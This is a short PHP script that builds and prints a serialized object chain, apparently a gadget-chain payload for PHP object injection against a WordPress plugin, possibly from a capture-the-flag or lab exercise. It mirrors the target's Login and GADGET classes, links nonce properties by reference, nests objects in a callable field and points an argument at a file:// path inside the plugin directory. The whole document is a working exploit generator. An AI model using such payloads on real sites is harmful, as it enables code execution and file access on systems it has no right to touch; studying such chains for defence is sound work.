<?php

class Login
{
    protected $login_nonce = '';
    protected $user_nonce = '';
    public $user_func = '';
    public $user_arg = '';
    public function __construct()
    {
        $this->user_nonce = &$this->login_nonce;
    }
}

class GADGET
{
    private $value = '';
    public function __construct($value)
    {
        $this->value = $value;
    }
}

$login1 = new Login();
$login1->user_arg = "file:///var/www/html/wp-content/plugins/gadget/cli/php.cli";

$login2 = new Login();
$login2->user_func = $login1;

$gadget = new GADGET($login2);

echo(serialize($gadget));
